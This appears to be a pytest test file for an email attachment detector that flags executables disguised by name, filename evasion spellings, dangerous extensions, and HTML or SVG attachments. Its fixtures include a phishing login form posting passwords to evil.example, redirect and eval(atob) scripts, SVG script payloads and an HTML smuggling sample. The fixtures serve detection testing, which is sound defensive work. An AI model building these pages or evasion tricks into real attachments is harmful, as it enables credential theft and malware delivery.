"""Attachment depth: what a file is, not what its name says.

Four gaps, each tested from both sides (the evasion must be caught, the
ordinary file next to it must stay quiet):

* content signature vs. extension (``detector.filetype``)
* extensions and filename spellings the name checks did not know
* HTML / SVG attachments read as the pages they are
* files that no filename and no "attachment" disposition announced
"""
from email.message import EmailMessage
from email.mime.application import MIMEApplication
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from types import SimpleNamespace

import pytest

from detector import analyzer, config, parser
from detector.checks import attachment_deep, attachments, qr
from detector.filetype import LABELS, sniff
from detector.parser import Attachment
from detector.scoring import SOFT_IDS, STACK_IDS

CTX = analyzer.build_context(config=config.DEFAULTS)

PE = b"MZ" + b"\x90" * 58 + (64).to_bytes(4, "little") + b"PE\x00\x00" + b"\x00" * 32
ELF = b"\x7fELF\x02\x01\x01" + b"\x00" * 32
LNK = b"L\x00\x00\x00" + bytes.fromhex("0114020000000000c000000000000046") + b"\x00" * 40
OLE = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 64
ZIP = b"PK\x03\x04" + b"\x00" * 32
PNG = b"\x89PNG\r\n\x1a\n" + b"\x00" * 32
JPEG = b"\xff\xd8\xff\xe0" + b"\x00" * 32
PDF = b"%PDF-1.7\n1 0 obj\n<<>>\nendobj\n%%EOF"
RAR = b"Rar!\x1a\x07\x00" + b"\x00" * 32
HTML = b"<!DOCTYPE html>\n<html><body><p>Merhaba</p></body></html>"
SVG = (b'<?xml version="1.0"?>\n<svg xmlns="http://www.w3.org/2000/svg">'
       b'<path d="M0 0L10 10"/></svg>')


def att(name, data, ctype="application/octet-stream"):
    return Attachment(filename=name, content_type=ctype, size=len(data), payload=data)


def by_name(*atts):
    return attachments.run(SimpleNamespace(attachments=list(atts)))


def by_content(*atts):
    return attachment_deep.run(SimpleNamespace(attachments=list(atts)))


def ids(indicators):
    return [i.id for i in indicators]


# -- filetype.sniff ----------------------------------------------------------


@pytest.mark.parametrize("data, kind", [
    (PE, "exe"), (ELF, "exe"), (LNK, "exe"),
    (OLE, "ole"), (ZIP, "zip"), (PNG, "image"), (JPEG, "image"),
    (b"GIF89a" + b"\x00" * 16, "image"),
    (b"RIFF\x10\x00\x00\x00WEBPVP8 ", "image"),
    (RAR, "archive"), (b"7z\xbc\xaf\x27\x1c" + b"\x00" * 16, "archive"),
    (b"\x1f\x8b\x08\x00" + b"\x00" * 16, "archive"),
    (b"{\\rtf1\\ansi hello}", "rtf"),
    (PDF, "pdf"), (b"\r\n\r\n junk " + PDF, "pdf"),
    (HTML, "html"), (b"\xef\xbb\xbf  <html><body>x</body></html>", "html"),
    (HTML.decode().encode("utf-16"), "html"),
    (SVG, "svg"), (b"<svg xmlns='http://www.w3.org/2000/svg'/>", "svg"),
])
def test_sniff_recognises(data, kind):
    assert sniff(data) == kind and kind in LABELS


@pytest.mark.parametrize("data", [
    b"",
    b"hello, this is a text file",
    b"MZ is how this sentence happens to start, nothing more to it than that....",
    b'<?xml version="1.0"?><invoice><total>10</total></invoice>',
    b"col1;col2\n1;2\n",
])
def test_sniff_does_not_guess(data):
    assert sniff(data) == ""


# -- content vs. extension ---------------------------------------------------


def test_executable_behind_a_document_name_is_hard_evidence():
    found = by_name(att("fatura.pdf", PE, "application/pdf"))
    assert ids(found) == ["disguised_executable"]
    assert "disguised_executable" not in SOFT_IDS
    assert "fatura.pdf" in found[0].evidence and ".pdf" in found[0].evidence


@pytest.mark.parametrize("name", ["foto.jpg", "rapor.docx", "notlar.txt", "veri.bin",
                                  "(unnamed)"])
def test_executable_content_is_caught_under_any_harmless_name(name):
    assert "disguised_executable" in ids(by_name(att(name, PE)))
    assert "disguised_executable" in ids(by_name(att(name, LNK)))


def test_one_lie_one_finding():
    """Bytes AND MIME contradicting the extension is the same observation twice."""
    found = by_name(att("fatura.pdf", PE, "application/x-msdownload"))
    assert ids(found) == ["disguised_executable"]
    found = by_name(att("fatura.pdf", HTML, "text/html"))
    assert ids(found) == ["content_extension_mismatch"]


def test_executable_under_an_executable_name_is_just_a_dangerous_attachment():
    assert ids(by_name(att("setup.exe", PE))) == ["dangerous_attachment"]
    assert ids(by_name(att("kisayol.lnk", LNK))) == ["dangerous_attachment"]


@pytest.mark.parametrize("name, data", [
    ("fatura.pdf", HTML), ("fatura.pdf", ZIP), ("foto.png", HTML),
    ("logo.jpg", SVG), ("rapor.docx", PDF),
])
def test_content_that_contradicts_the_extension_is_a_soft_carrier_signal(name, data):
    found = by_name(att(name, data))
    assert ids(found) == ["content_extension_mismatch"]
    assert "content_extension_mismatch" in SOFT_IDS
    assert "content_extension_mismatch" in STACK_IDS


def test_archive_name_over_other_content_keeps_both_findings():
    assert ids(by_name(att("arsiv.zip", PDF))) == ["archive_attachment",
                                                   "content_extension_mismatch"]


@pytest.mark.parametrize("name, data", [
    ("fatura.pdf", PDF),
    ("foto.jpg", PNG), ("foto.png", JPEG),        # phones mislabel images all day
    ("rapor.docx", ZIP), ("rapor.docx", OLE),     # OLE = password-protected OOXML
    ("tablo.xlsm", ZIP),
    ("arsiv.zip", ZIP), ("arsiv.zip", RAR),
    ("fatura.pdf", b"not recognisable bytes"),    # unknown proves nothing
    ("export.xls", HTML),                         # web export saved as .xls
    ("notlar.txt", HTML),
])
def test_honest_or_unknowable_content_is_left_alone(name, data):
    found = ids(by_name(att(name, data)))
    assert "content_extension_mismatch" not in found
    assert "disguised_executable" not in found


def test_declared_mime_mismatch_still_works_when_the_bytes_are_unknown():
    found = by_name(att("fatura.pdf", b"????", "application/zip"))
    assert ids(found) == ["mime_extension_mismatch"]


# -- extensions and spellings ------------------------------------------------


@pytest.mark.parametrize("ext", ["one", "xll", "chm", "url", "iqy", "dll", "cpl",
                                 "wsh", "sct", "msix", "appinstaller", "jnlp",
                                 "library-ms", "settingcontent-ms", "mht", "xhtml"])
def test_extensions_that_run_or_fetch_code_are_dangerous(ext):
    assert ids(by_name(att("belge." + ext, b"x"))) == ["dangerous_attachment"]


@pytest.mark.parametrize("ext", ["vhd", "vhdx", "cab", "gz", "tar", "ace", "dmg"])
def test_more_containers_count_as_archives(ext):
    assert ids(by_name(att("belge." + ext, b"x"))) == ["archive_attachment"]


@pytest.mark.parametrize("ext", ["xlsb", "xltm", "ppsm", "ppam", "xla"])
def test_more_macro_capable_formats(ext):
    assert ids(by_name(att("belge." + ext, b"x"))) == ["macro_document"]


@pytest.mark.parametrize("name", [
    "fatura.exe.",              # Windows drops the trailing dot
    "fatura.exe...",
    "fatura.exe ",
    "fatura.exe​",         # zero-width space after the extension
    "fatura.e​xe",         # ...or inside it
    "fatura. exe",
    "FATURA.EXE.",
])
def test_filename_spellings_do_not_hide_the_extension(name):
    a = att(name, b"x")
    assert a.ext == "exe"
    assert ids(by_name(a)) == ["dangerous_attachment"]


@pytest.mark.parametrize("name", ["fatura.pdf.exe.", "fatura.pdf        .exe",
                                  "fatura.pdf.exe​"])
def test_double_extension_survives_the_same_spellings(name):
    assert ids(by_name(att(name, b"x"))) == ["double_extension", "dangerous_attachment"]


@pytest.mark.parametrize("name, ext", [
    ("rapor.v2.final.pdf", "pdf"), ("Toplantı notları.docx", "docx"),
    ("(unnamed)", ""), ("README", ""), ("arsiv.tar.gz", "gz"),
])
def test_ordinary_names_keep_their_extension(name, ext):
    assert att(name, b"x").ext == ext


def test_ordinary_document_names_raise_nothing():
    assert by_name(att("rapor.v2.final.pdf", PDF, "application/pdf"),
                   att("Toplantı notları.docx", ZIP)) == []


# -- HTML / SVG attachments are pages ----------------------------------------


LOGIN = (b'<html><body><form action="https://evil.example/collect" method="post">'
         b'<input name="u"><input type="password" name="p"></form>'
         b'<script>window.location.href = "https://evil.example/next";</script>'
         b'</body></html>')


def test_login_form_in_an_html_attachment():
    found = by_content(att("giris.html", LOGIN, "text/html"))
    assert ids(found) == ["html_attachment_form"]       # one page, one finding
    assert "evil.example" in found[0].evidence and "giris.html" in found[0].evidence


def test_password_field_alone_is_enough():
    page = b'<html><form><input type="password" name="p"></form></html>'
    assert ids(by_content(att("a.htm", page))) == ["html_attachment_form"]


@pytest.mark.parametrize("page", [
    b'<html><script>window.location.href="https://evil.example/";</script></html>',
    b'<html><script>location.replace("https://evil.example/")</script></html>',
    b'<html><script>top.location = "https://evil.example/"</script></html>',
    b'<html><script>window.open("https://evil.example/")</script></html>',
    b'<html><body onload="location=\'https://evil.example/\'">x</body></html>',
    b'<html><head><meta http-equiv="refresh" content="0;url=https://evil.example/">'
    b'</head></html>',
    b'<html><script>eval(atob("ZG9jdW1lbnQud3JpdGUoMSk="))</script></html>',
])
def test_attached_page_that_redirects_or_hides_its_script(page):
    assert ids(by_content(att("belge.html", page, "text/html"))) == ["html_attachment_script"]


def test_page_is_recognised_by_mime_type_without_an_extension():
    assert ids(by_content(att("(unnamed)", LOGIN, "text/html"))) == ["html_attachment_form"]


def test_utf16_page_is_read():
    page = LOGIN.decode().encode("utf-16")
    assert ids(by_content(att("giris.html", page))) == ["html_attachment_form"]


@pytest.mark.parametrize("page", [
    b"<html><body><h1>Aylik rapor</h1><table><tr><td>1</td></tr></table></body></html>",
    b"<html><body><p>Location = Salon 5, saat 14:00</p></body></html>",
    b"<html><script>var toplam = 1 + 2; console.log(toplam);</script><p>x</p></html>",
    b'<html><script>if (location.href == "x") { console.log(1); }</script></html>',
    b'<html><form action="/ara"><input name="q"></form></html>',   # relative, no host
])
def test_ordinary_html_attachment_raises_no_page_finding(page):
    assert by_content(att("rapor.html", page, "text/html")) == []


@pytest.mark.parametrize("svg", [
    b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
    b'<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(1)"><path d="M0 0"/></svg>',
    b'<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript:alert(1)">'
    b'<text>x</text></a></svg>',
])
def test_svg_that_carries_code(svg):
    assert ids(by_content(att("logo.svg", svg, "image/svg+xml"))) == ["html_attachment_script"]
    assert ids(by_content(att("(unnamed)", svg, "image/svg+xml"))) == ["html_attachment_script"]


def test_svg_with_a_login_form_inside():
    svg = (b'<svg xmlns="http://www.w3.org/2000/svg"><foreignObject>'
           b'<form action="https://evil.example/c"><input type="password"></form>'
           b'</foreignObject></svg>')
    assert ids(by_content(att("fatura.svg", svg))) == ["html_attachment_form"]


def test_plain_svg_drawing_is_just_a_drawing():
    assert by_content(att("logo.svg", SVG, "image/svg+xml")) == []
    diagram = (b'<svg xmlns="http://www.w3.org/2000/svg"><foreignObject>'
               b'<div>kutu metni</div></foreignObject></svg>')       # draw.io style
    assert by_content(att("diyagram.svg", diagram)) == []


def test_smuggling_is_still_reported_next_to_the_page_finding():
    page = (b"<html><script>var b = atob('" + b"QUJD" * 80 + b"');"
            b"var u = URL.createObjectURL(new Blob([b]));"
            b"location.href = u;</script></html>")
    assert ids(by_content(att("fatura.html", page))) == ["html_smuggling",
                                                         "html_attachment_script"]


# -- files nobody announced --------------------------------------------------


def related_mail(*parts):
    root = MIMEMultipart("related")
    root["From"] = "Kargo <bilgi@kargo-takip.example>"
    root["To"] = "ali@alici.com"
    root["Subject"] = "Paketiniz"
    root.attach(MIMEText('<p>Kodu okutun</p><img src="cid:qr1">', "html"))
    for p in parts:
        root.attach(p)
    return parser.parse_bytes(root.as_bytes())


def test_inline_image_without_a_filename_is_seen():
    img = MIMEImage(PNG, _subtype="png")
    img["Content-ID"] = "<qr1>"
    email = related_mail(img)
    assert [(a.filename, a.content_type) for a in email.attachments] == [
        ("(unnamed)", "image/png")]
    assert list(qr._image_blobs(email)) == [PNG]        # the QR scan reaches it


def test_nameless_binary_part_is_seen_and_judged():
    email = related_mail(MIMEApplication(PE))           # no name, no disposition
    assert [a.content_type for a in email.attachments] == ["application/octet-stream"]
    assert "disguised_executable" in {i.id for i in analyzer.analyze(email, ctx=CTX).indicators}


def test_bodies_and_signatures_are_not_attachments():
    sig = MIMEApplication(b"-----BEGIN PGP SIGNATURE-----", _subtype="pgp-signature")
    assert related_mail(sig).attachments == []
    m = EmailMessage()
    m["From"] = "a@example.com"
    m["Subject"] = "x"
    m.set_content("duz metin")
    m.add_alternative("<p>html</p>", subtype="html")
    assert parser.parse_bytes(m.as_bytes()).attachments == []
    assert parser.parse_text("From: a@example.com\r\nSubject: x\r\n\r\nmerhaba").attachments == []


def test_mail_whose_whole_body_is_the_file():
    raw = (b"From: Tarayici <scan@example.com>\r\nSubject: Taranan belge\r\n"
           b"MIME-Version: 1.0\r\n"
           b'Content-Type: application/pdf; name="tarama.pdf"\r\n'
           b"Content-Transfer-Encoding: 7bit\r\n\r\n" + PDF)
    email = parser.parse_bytes(raw)
    assert [(a.filename, a.ext) for a in email.attachments] == [("tarama.pdf", "pdf")]


# -- end to end --------------------------------------------------------------


def mail_with(name, data, maintype, subtype):
    m = EmailMessage()
    m["From"] = "Muhasebe <muhasebe@tedarikci.example>"
    m["To"] = "ali@alici.com"
    m["Subject"] = "Belge"
    m["Received"] = ("from mail.example.net ([93.184.216.34]) by mx.alici.com "
                     "with ESMTPS; Mon, 2 Nov 2026 10:00:00 +0300")
    m.set_content("Ekte.")
    m.add_attachment(data, maintype=maintype, subtype=subtype, filename=name)
    return analyzer.analyze(parser.parse_bytes(m.as_bytes()), ctx=CTX)


def test_login_page_attachment_is_high():
    r = mail_with("giris.html", LOGIN, "text", "html")
    assert {"dangerous_attachment", "html_attachment_form"} <= {i.id for i in r.indicators}
    assert r.verdict == "high"


def test_scripted_svg_attachment_is_high():
    svg = b'<svg xmlns="http://www.w3.org/2000/svg"><script>location="https://e.example"</script></svg>'
    assert mail_with("fatura.svg", svg, "image", "svg+xml").verdict == "high"


def test_executable_named_pdf_is_medium_on_its_own():
    r = mail_with("fatura.pdf", PE, "application", "pdf")
    assert r.breakdown.hard == 18 and r.verdict == "medium"


def test_plain_html_report_attachment_is_unchanged():
    r = mail_with("rapor.html", HTML, "text", "html")
    assert [i.id for i in r.indicators if i.category == "attachment"] == [
        "dangerous_attachment"]
    assert r.verdict == "medium"


def test_real_pdf_and_photo_attachments_raise_nothing():
    assert mail_with("fatura.pdf", PDF, "application", "pdf").verdict == "low"
    r = mail_with("foto.jpg", PNG, "image", "jpeg")
    assert not [i for i in r.indicators if i.category == "attachment"]
